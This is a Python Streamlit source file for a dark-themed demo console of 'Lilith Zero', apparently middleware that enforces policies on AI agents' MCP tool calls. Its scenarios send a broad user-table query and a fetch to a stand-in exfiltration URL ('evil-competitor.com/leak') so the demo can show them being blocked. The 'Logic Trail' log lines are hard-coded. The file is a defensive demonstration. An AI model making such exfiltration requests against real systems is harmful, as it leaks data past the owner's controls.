import streamlit as st
import asyncio
import os
import sys
import json
import re
from datetime import datetime

# --- Windows Compatibility Fix ---
if os.name == 'nt':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except AttributeError:
        pass

# Path setup to find Lilith Zero SDK and middleware
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../"))
sys.path.insert(0, os.path.join(ROOT_DIR, "sdk/src"))

try:
    from lilith_zero import Lilith
    from lilith_zero.exceptions import PolicyViolationError
except ImportError:
    st.error("Lilith Zero SDK not found. Build required.")
    st.stop()

# Constants
_EXT = ".exe" if os.name == "nt" else ""
LILITH_BINARY = os.path.join(ROOT_DIR, "lilith-zero/target/release/lilith-zero" + _EXT)
POLICY_PATH = os.path.join(os.path.dirname(__file__), "demo_policy.yaml")
SERVER_SCRIPT = os.path.join(os.path.dirname(__file__), "vulnerable_server.py")

# Page Config
st.set_page_config(
    page_title="LILITH ZERO | SECURITY CONTROLLER",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# --- ULTRA POLISHED DARK TERMINAL THEME ---
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');

    html, body, [data-testid="stAppViewContainer"] {
        background-color: #050505;
        color: #e0e0e0;
        font-family: 'JetBrains Mono', monospace;
    }
    
    .stMarkdown, .stText, p, h1, h2, h3, h4, span, label {
        font-family: 'JetBrains Mono', monospace !important;
    }

    header[data-testid="stHeader"] {
        background: rgba(0,0,0,0);
    }

    /* Command Center Container */
    .terminal-window {
        background: #0a0a0a;
        border: 1px solid #222;
        border-radius: 4px;
        padding: 20px;
        box-shadow: 0 4px 50px rgba(0,0,0,0.5);
        margin-bottom: 20px;
    }

    /* Custom Terminal Header */
    .terminal-header {
        color: #666;
        font-size: 0.7rem;
        text-transform: uppercase;
        letter-spacing: 2px;
        margin-bottom: 20px;
        border-bottom: 1px solid #1a1a1a;
        padding-bottom: 10px;
        display: flex;
        justify-content: space-between;
    }

    /* Output Blocks */
    .output-block {
        background: #0d0d0d;
        border-left: 2px solid #222;
        padding: 15px;
        font-size: 0.85rem;
        margin: 10px 0;
    }
    
    .status-denied { color: #ff3333; border-left-color: #ff3333; }
    .status-allowed { color: #33ff66; border-left-color: #33ff66; }
    .status-info { color: #33ccff; border-left-color: #33ccff; }

    /* Button Styling */
    .stButton>button {
        background-color: #000;
        color: #fff;
        border: 1px solid #33ff66;
        border-radius: 2px;
        font-family: 'JetBrains Mono', monospace;
        letter-spacing: 1px;
        text-transform: uppercase;
        transition: all 0.2s;
        width: 100%;
    }
    .stButton>button:hover {
        background-color: #33ff66;
        color: #000;
        box-shadow: 0 0 20px rgba(51, 255, 102, 0.4);
    }

    /* Form Inputs */
    .stTextArea textarea {
        background-color: #0a0a0a !important;
        color: #33ff66 !important;
        border: 1px solid #222 !important;
        font-family: 'JetBrains Mono', monospace !important;
    }
    
    .stRadio label {
        color: #888 !important;
    }
    .stRadio div[data-testid="stMarkdownContainer"] p {
        color: #e0e0e0 !important;
    }

    /* Divider */
    hr {
        border: 0;
        border-top: 1px solid #1a1a1a;
        margin: 2rem 0;
    }

    /* Sidebar cleanup */
    [data-testid="stSidebar"] {
        background-color: #030303;
        border-right: 1px solid #111;
    }
</style>
""", unsafe_allow_html=True)

# Main Application Frame
st.markdown("""
    <div style='display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 40px;'>
        <div>
            <h1 style='margin: 0; font-weight: 700; font-size: 1.5rem; letter-spacing: -1px;'>LILITH<span style='color: #33ff66;'>ZERO</span></h1>
            <p style='color: #555; font-size: 0.7rem; margin: 0;'>SECURE MCP MIDDLEWARE // ARCHITECTURAL VERSION 0.1.1</p>
        </div>
        <div style='text-align: right;'>
            <p style='color: #33ff66; font-size: 0.7rem; margin: 0;'>[ SYSTEM: ONLINE ]</p>
            <p style='color: #555; font-size: 0.7rem; margin: 0;'>ENFORCEMENT MODE: ACTIVE</p>
        </div>
    </div>
""", unsafe_allow_html=True)

col_config, col_main = st.columns([1, 2], gap="large")

with col_config:
    st.markdown('<div class="terminal-header">Routing & Policy</div>', unsafe_allow_html=True)
    
    if os.path.exists(POLICY_PATH):
        with open(POLICY_PATH, "r") as f:
            policy_content = f.read()
        
        updated_policy = st.text_area("POLICY_DEFINITION.YAML", value=policy_content, height=450)
        
        if updated_policy != policy_content:
            if st.button("Hot-Reload Policy"):
                with open(POLICY_PATH, "w") as f:
                    f.write(updated_policy)
                st.rerun()
    
    st.markdown("""
        <div style='color: #555; font-size: 0.7rem; margin-top: 20px;'>
            UPSTREAM_TYPE: PYTHON_MCP<br>
            SANDBOX_TIER: 2 (RESTRICTED)<br>
            ISOLATION_ENGINE: RUST_L3Z_CORE
        </div>
    """, unsafe_allow_html=True)

with col_main:
    st.markdown('<div class="terminal-header">Security Controller // Live Intercept</div>', unsafe_allow_html=True)
    
    scenario = st.radio(
        "SELECT OPERATIONAL CONTEXT:",
        [
            "BASELINE_INTERNAL_BYPASS",
            "PROTECTED_RLS_CONTAINMENT",
            "PROTECTED_EGRESS_CONTROL",
            "PROTECTED_AUTHORIZED_QUERY"
        ],
        label_visibility="collapsed"
    )
    
    st.markdown("<br>", unsafe_allow_html=True)
    
    if st.button("Execute Intent"):
        output_placeholder = st.container()
        
        if "BASELINE" in scenario:
            with output_placeholder:
                st.markdown(f"""
                    <div class="output-block status-denied">
                        <span style='font-size: 0.7rem; color: #ff3333;'>ERROR: VULNERABILITY_EXPOSED</span><br>
                        Baseline direct access bypasses all middleware security.
                    </div>
                    <div class="output-block">
                        <span style='font-size: 0.7rem; color: #666;'>UPSTREAM_DATA_DUMP:</span><br>
                        <code>[{{'id': 1, 'username': 'admin', 'api_key': 'sk_live_88374'}}]</code>
                    </div>
                """, unsafe_allow_html=True)
        else:
            async def run_op(tool, args):
                try:
                    async with Lilith(
                        upstream=f"{sys.executable} {SERVER_SCRIPT}",
                        policy=POLICY_PATH,
                        binary=LILITH_BINARY
                    ) as client:
                        start_time = datetime.now()
                        result = await client.call_tool(tool, args)
                        latency = (datetime.now() - start_time).total_seconds() * 1000
                        
                        raw_text = result['content'][0]['text']
                        clean_text = re.sub(r'<<<LILITH_ZERO_DATA_(START|END):[a-zA-Z0-9]+>>>', '', raw_text).strip()
                        
                        st.markdown(f"""
                            <div class="output-block status-allowed">
                                <span style='font-size: 0.7rem; color: #33ff66;'>SUCCESS: POLICY_COMPLIANT</span><br>
                                Request validated and processed (Latency: {latency:.1f}ms)
                            </div>
                            <div class="output-block">
                                <span style='font-size: 0.7rem; color: #666;'>SANITIZED_RESPONSE:</span><br>
                                {clean_text}
                            </div>
                        """, unsafe_allow_html=True)
                        
                except PolicyViolationError as e:
                    st.markdown(f"""
                        <div class="output-block status-denied">
                            <span style='font-size: 0.7rem; color: #ff3333;'>INTERVENE: POLICY_VIOLATION</span><br>
                            Unauthorized intent detected and nullified at the runtime layer.
                        </div>
                        <div class="output-block">
                            <span style='font-size: 0.7rem; color: #666;'>DENIAL_REASON:</span><br>
                            {str(e)}
                        </div>
                    """, unsafe_allow_html=True)
                except Exception as e:
                    st.error(f"RUNTIME_EXCEPTION: {repr(e)}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            if scenario == "PROTECTED_RLS_CONTAINMENT":
                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT * FROM users"}))
            elif scenario == "PROTECTED_EGRESS_CONTROL":
                loop.run_until_complete(run_op("fetch_url", {"url": "http://evil-competitor.com/leak"}))
            elif scenario == "PROTECTED_AUTHORIZED_QUERY":
                loop.run_until_complete(run_op("execute_sql", {"query": "SELECT COUNT(*) FROM users"}))
            
            loop.close()

    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown('<div class="terminal-header">Logic Trail & Resource State</div>', unsafe_allow_html=True)
    
    st.markdown(f"""
        <div style='font-family: "JetBrains Mono"; font-size: 0.7rem; color: #444;'>
            [ {datetime.now().strftime('%H:%M:%S')} ] HANDSHAKE_INIT_MCP_V2024.11.05<br>
            [ {datetime.now().strftime('%H:%M:%S')} ] SUPERVISOR_SPAWN_PROCID_12842<br>
            [ {datetime.now().strftime('%H:%M:%S')} ] ENGINE_POLICY_MOUNTED_HASH_883A1<br>
            [ {datetime.now().strftime('%H:%M:%S')} ] RESOURCE_USAGE_CPU_0.2_MEM_14MB
        </div>
    """, unsafe_allow_html=True)

# Architectural Footer
st.markdown("""
<div style='margin-top: 100px; padding-top: 20px; border-top: 1px solid #111; display: flex; justify-content: space-between; font-size: 0.6rem; color: #333;'>
    <div>LILITH_ZERO_CORE // BUILT_WITH_RUST</div>
    <div>ZERO_TRUST_MCP_ADAPTER</div>
    <div>AUTHENTICITY_VERIFIED_BAD_COMPANY</div>
</div>
""", unsafe_allow_html=True)
